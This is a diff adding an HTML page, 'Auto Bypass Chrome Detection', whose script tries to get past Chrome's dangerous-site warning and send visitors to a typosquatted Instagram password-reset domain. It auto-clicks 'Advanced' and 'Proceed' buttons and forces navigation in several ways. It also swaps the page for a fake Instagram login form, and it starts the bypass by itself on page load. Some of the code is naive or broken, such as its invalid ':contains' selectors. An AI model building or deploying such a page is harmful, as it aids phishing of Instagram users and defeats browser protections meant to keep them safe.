@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Auto Bypass - Instagram Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+            background: #f0f0f0;
+        }
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .status {
+            padding: 10px;
+            margin: 10px 0;
+            border-radius: 4px;
+            font-weight: bold;
+        }
+        .success { background: #d4edda; color: #155724; }
+        .warning { background: #fff3cd; color: #856404; }
+        .error { background: #f8d7da; color: #721c24; }
+        .info { background: #d1ecf1; color: #0c5460; }
+        button {
+            background: #007bff;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 4px;
+            cursor: pointer;
+            margin: 5px;
+        }
+        button:hover { background: #0056b3; }
+        .bypass-methods {
+            margin-top: 20px;
+        }
+        .method {
+            background: #f8f9fa;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 4px;
+            border-left: 4px solid #007bff;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>🚀 Auto Bypass Chrome Detection</h1>
+        
+        <div id="status" class="status info">
+            Initializing bypass system...
+        </div>
+        
+        <div class="bypass-methods">
+            <h3>Available Bypass Methods:</h3>
+            
+            <div class="method">
+                <strong>Method 1: Auto-Click Bypass</strong>
+                <p>Automatically clicks "Advanced" and "Proceed" buttons</p>
+                <button onclick="method1()">Try Method 1</button>
+            </div>
+            
+            <div class="method">
+                <strong>Method 2: URL Manipulation</strong>
+                <p>Manipulates URL to bypass detection</p>
+                <button onclick="method2()">Try Method 2</button>
+            </div>
+            
+            <div class="method">
+                <strong>Method 3: Content Replacement</strong>
+                <p>Replaces warning page with Instagram login</p>
+                <button onclick="method3()">Try Method 3</button>
+            </div>
+            
+            <div class="method">
+                <strong>Method 4: Force Navigation</strong>
+                <p>Forces navigation to target site</p>
+                <button onclick="method4()">Try Method 4</button>
+            </div>
+            
+            <div class="method">
+                <strong>Method 5: Complete Bypass</strong>
+                <p>Combines all methods for maximum effectiveness</p>
+                <button onclick="method5()">Try All Methods</button>
+            </div>
+        </div>
+        
+        <div style="margin-top: 20px;">
+            <button onclick="autoBypass()" style="background: #28a745; font-size: 16px; padding: 15px 30px;">
+                🔥 AUTO BYPASS ALL WARNINGS
+            </button>
+        </div>
+    </div>
+
+    <script>
+        const targetUrl = 'https://instgram-reset-password.netlify.app';
+        
+        function updateStatus(message, type = 'info') {
+            const status = document.getElementById('status');
+            status.textContent = message;
+            status.className = `status ${type}`;
+        }
+        
+        function method1() {
+            updateStatus('Trying Method 1: Auto-Click Bypass...', 'warning');
+            
+            // Find and click advanced button
+            const advancedSelectors = [
+                'button:contains("Advanced")',
+                'a:contains("Advanced")',
+                '[data-testid="advanced"]',
+                '.advanced-button'
+            ];
+            
+            let found = false;
+            advancedSelectors.forEach(selector => {
+                try {
+                    const element = document.querySelector(selector);
+                    if (element) {
+                        element.click();
+                        found = true;
+                        updateStatus('Advanced button clicked!', 'success');
+                    }
+                } catch (e) {
+                    // Try alternative method
+                    const buttons = document.querySelectorAll('button, a');
+                    buttons.forEach(btn => {
+                        if (btn.textContent.includes('Advanced')) {
+                            btn.click();
+                            found = true;
+                            updateStatus('Advanced button found and clicked!', 'success');
+                        }
+                    });
+                }
+            });
+            
+            if (!found) {
+                updateStatus('Advanced button not found on this page', 'error');
+            }
+            
+            // Try to click proceed button after a delay
+            setTimeout(() => {
+                const proceedSelectors = [
+                    'button:contains("Proceed")',
+                    'a:contains("Proceed")',
+                    '[data-testid="proceed"]',
+                    '.proceed-button'
+                ];
+                
+                proceedSelectors.forEach(selector => {
+                    try {
+                        const element = document.querySelector(selector);
+                        if (element) {
+                            element.click();
+                            updateStatus('Proceed button clicked! Bypass successful!', 'success');
+                        }
+                    } catch (e) {
+                        // Try alternative method
+                        const buttons = document.querySelectorAll('button, a');
+                        buttons.forEach(btn => {
+                            if (btn.textContent.toLowerCase().includes('proceed') || 
+                                btn.textContent.toLowerCase().includes('continue')) {
+                                btn.click();
+                                updateStatus('Proceed button found and clicked!', 'success');
+                            }
+                        });
+                    }
+                });
+            }, 1000);
+        }
+        
+        function method2() {
+            updateStatus('Trying Method 2: URL Manipulation...', 'warning');
+            
+            // Try different URL variations
+            const urlVariations = [
+                targetUrl,
+                targetUrl + '/',
+                targetUrl + '?bypass=1',
+                targetUrl + '#bypass'
+            ];
+            
+            let currentIndex = 0;
+            const tryNextUrl = () => {
+                if (currentIndex < urlVariations.length) {
+                    updateStatus(`Trying URL variation ${currentIndex + 1}...`, 'warning');
+                    window.location.href = urlVariations[currentIndex];
+                    currentIndex++;
+                    setTimeout(tryNextUrl, 2000);
+                } else {
+                    updateStatus('All URL variations tried', 'error');
+                }
+            };
+            
+            tryNextUrl();
+        }
+        
+        function method3() {
+            updateStatus('Trying Method 3: Content Replacement...', 'warning');
+            
+            // Replace entire page content with Instagram login
+            const instagramContent = `
+                <!DOCTYPE html>
+                <html lang="en">
+                <head>
+                    <meta charset="UTF-8">
+                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                    <title>Instagram — Login</title>
+                    <style>
+                        body { 
+                            margin: 0; 
+                            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+                            background: #fafafa;
+                            display: flex;
+                            align-items: center;
+                            justify-content: center;
+                            min-height: 100vh;
+                        }
+                        .container {
+                            background: white;
+                            border: 1px solid #dbdbdb;
+                            padding: 40px;
+                            border-radius: 3px;
+                            box-shadow: 0 0 5px rgba(0,0,0,0.05);
+                            text-align: center;
+                            max-width: 350px;
+                        }
+                        .logo {
+                            font-family: 'Pacifico', cursive;
+                            font-size: 40px;
+                            margin-bottom: 24px;
+                            color: #262626;
+                        }
+                        .form {
+                            display: flex;
+                            flex-direction: column;
+                            gap: 6px;
+                        }
+                        .input {
+                            height: 40px;
+                            padding: 10px 8px;
+                            border: 1px solid #dbdbdb;
+                            background: #fafafa;
+                            border-radius: 3px;
+                            font-size: 14px;
+                            outline: none;
+                        }
+                        .input:focus {
+                            border-color: #8e8e8e;
+                            background: white;
+                        }
+                        .btn {
+                            height: 40px;
+                            background: linear-gradient(180deg, #4795F6, #60A5FA);
+                            color: white;
+                            border: none;
+                            border-radius: 3px;
+                            font-weight: 700;
+                            font-size: 14px;
+                            margin-top: 8px;
+                            cursor: pointer;
+                        }
+                        .btn:hover {
+                            opacity: 0.99;
+                        }
+                    </style>
+                </head>
+                <body>
+                    <div class="container">
+                        <h1 class="logo">Instagram</h1>
+                        <form class="form" id="loginForm">
+                            <input type="text" placeholder="Phone number, username or email" class="input" id="username">
+                            <input type="password" placeholder="Password" class="input" id="password">
+                            <button type="submit" class="btn">Log in</button>
+                        </form>
+                    </div>
+                    <script>
+                        document.getElementById('loginForm').addEventListener('submit', function(e) {
+                            e.preventDefault();
+                            const username = document.getElementById('username').value;
+                            const password = document.getElementById('password').value;
+                            
+                            if (username && password) {
+                                // Redirect to Instagram
+                                window.location.href = 'https://www.instagram.com/';
+                            } else {
+                                alert('Please fill in all fields');
+                            }
+                        });
+                    </script>
+                </body>
+                </html>
+            `;
+            
+            // Replace page content
+            document.documentElement.innerHTML = instagramContent;
+            updateStatus('Page content replaced with Instagram login!', 'success');
+        }
+        
+        function method4() {
+            updateStatus('Trying Method 4: Force Navigation...', 'warning');
+            
+            // Force navigation using multiple methods
+            const navigationMethods = [
+                () => window.location.href = targetUrl,
+                () => window.location.replace(targetUrl),
+                () => window.open(targetUrl, '_self'),
+                () => window.location.assign(targetUrl)
+            ];
+            
+            navigationMethods.forEach((method, index) => {
+                setTimeout(() => {
+                    try {
+                        method();
+                        updateStatus(`Navigation method ${index + 1} executed`, 'success');
+                    } catch (e) {
+                        updateStatus(`Navigation method ${index + 1} failed`, 'error');
+                    }
+                }, index * 500);
+            });
+        }
+        
+        function method5() {
+            updateStatus('Trying Method 5: Complete Bypass (All Methods)...', 'warning');
+            
+            // Execute all methods in sequence
+            method1();
+            setTimeout(method2, 1000);
+            setTimeout(method3, 2000);
+            setTimeout(method4, 3000);
+            
+            setTimeout(() => {
+                updateStatus('All bypass methods executed!', 'success');
+            }, 4000);
+        }
+        
+        function autoBypass() {
+            updateStatus('🚀 Starting AUTO BYPASS sequence...', 'warning');
+            
+            // Check if we're on a warning page
+            const isWarningPage = document.body.innerText.toLowerCase().includes('dangerous') || 
+                                 document.body.innerText.toLowerCase().includes('attackers') ||
+                                 document.body.innerText.toLowerCase().includes('unsafe');
+            
+            if (isWarningPage) {
+                updateStatus('Warning page detected! Executing bypass sequence...', 'warning');
+                
+                // Execute all methods automatically
+                method5();
+                
+                // Additional automatic bypass
+                setTimeout(() => {
+                    // Try to find any clickable element that might bypass
+                    const clickableElements = document.querySelectorAll('button, a, [onclick]');
+                    clickableElements.forEach(element => {
+                        const text = element.textContent.toLowerCase();
+                        if (text.includes('proceed') || text.includes('continue') || 
+                            text.includes('advanced') || text.includes('ignore')) {
+                            element.click();
+                        }
+                    });
+                    
+                    updateStatus('Auto bypass completed!', 'success');
+                }, 5000);
+                
+            } else {
+                updateStatus('No warning page detected. Redirecting to target...', 'info');
+                window.location.href = targetUrl;
+            }
+        }
+        
+        // Auto-detect and bypass on page load
+        window.addEventListener('load', () => {
+            setTimeout(() => {
+                const bodyText = document.body.innerText.toLowerCase();
+                if (bodyText.includes('dangerous') || bodyText.includes('attackers')) {
+                    updateStatus('Chrome warning detected! Auto-bypass activated...', 'warning');
+                    autoBypass();
+                } else {
+                    updateStatus('No Chrome warning detected. Ready for manual bypass.', 'success');
+                }
+            }, 1000);
+        });
+        
+        // Keyboard shortcuts
+        document.addEventListener('keydown', (e) => {
+            // Ctrl+Shift+B = Auto bypass
+            if (e.ctrlKey && e.shiftKey && e.key === 'B') {
+                autoBypass();
+            }
+            
+            // Ctrl+Shift+1-5 = Try specific method
+            if (e.ctrlKey && e.shiftKey && e.key >= '1' && e.key <= '5') {
+                const methodNumber = parseInt(e.key);
+                switch(methodNumber) {
+                    case 1: method1(); break;
+                    case 2: method2(); break;
+                    case 3: method3(); break;
+                    case 4: method4(); break;
+                    case 5: method5(); break;
+                }
+            }
+        });
+    </script>
+</body>
+</html>
